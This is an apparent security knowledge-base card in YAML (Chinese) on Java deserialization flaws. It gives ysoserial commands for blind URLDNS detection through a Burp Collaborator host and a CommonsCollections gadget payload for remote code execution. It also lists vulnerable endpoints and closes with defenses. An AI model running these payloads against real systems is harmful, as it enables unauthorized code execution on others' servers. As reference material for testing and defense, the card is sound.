@@ -1,0 +1,72 @@
+# 技术卡片: 反序列化 - Java URLDNS 探测
+# 分类: deserialization / java
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-DES-01 / ysoserial
+
+id: "deser-java-urldns"
+name: "反序列化 - Java URLDNS 漏洞探测"
+category: "deserialization"
+subcategory: "java"
+severity: "high"
+
+description: |
+  Java URLDNS gadget 通过 HashMap→URL→getHostAddress 触发 DNS 查询，
+  用于盲检测反序列化漏洞。零依赖，适用于所有 Java 版本。
+
+trigger_signals:
+  - "Java 应用接收序列化对象输入"
+  - "Cookie 以 rO0 开头（Base64 编码的 Java 序列化魔术字节）"
+  - "REST API 接收 Base64 编码的二进制数据"
+  - "Content-Type: application/x-java-serialized-object"
+
+payloads:
+  detection:
+    - command: "java -jar ysoserial.jar URLDNS http://COLLABORATOR.burpcollaborator.net | base64"
+    - note: "发送至反序列化入口 → Collaborator 收到 DNS 查询则漏洞确认"
+
+  deserialization_endpoints:
+    - "Cookie 参数: 解码 → 修改 → 重编码"
+    - "POST body: 直接发送序列化对象 Base64"
+    - "SOAP/AMF/Java RMI 端点"
+    - "JMX/RMI 注册表"
+    - "JSF ViewState (JavaServer Faces)"
+
+  ysoserial_gadgets:
+    commons_collections:
+      - "CommonsCollections1-7 (JDK ≤8u71 或特定版本)"
+      - "java -jar ysoserial.jar CommonsCollections4 'cmd' | base64"
+    commons_beanutils:
+      - "CommonsBeanutils1 (无 CC 依赖)"
+    jdk7u21:
+      - "JDK7u21 (JDK 7 通用)"
+    jre8u20:
+      - "JRE8u20 (JDK 8 早期版本)"
+    spring:
+      - "Spring1/Spring2 (Spring Framework)"
+
+success_indicators:
+  - "Burp Collaborator 收到 DNS 查询"
+  - "URLDNS 确认漏洞存在"
+  - "CommonsCollections 等 gadget 实现 RCE"
+
+prerequisites:
+  - "Java 应用反序列化用户输入"
+  - "未使用类型白名单 / ObjectInputFilter"
+  - "目标 classpath 含可利用 gadget 库"
+
+defense:
+  - "反序列化前做类型白名单校验（Look-Ahead Deserialization）"
+  - "使用安全的序列化格式（JSON/Protobuf）"
+  - "Java 17+ 的 ObjectInputFilter"
+  - "升级 Commons Collections 至安全版本"
+
+tools:
+  - "ysoserial: https://github.com/frohoff/ysoserial"
+  - "ysoserial.net: .NET 等价工具"
+  - "marshalsec: Java 反序列化利用"
+
+sources:
+  - kb: "KB-DES-01 / KB-DES-02"
+  - ref: "PortSwigger: Java Deserialization"
+  - ref: "CWE-502"
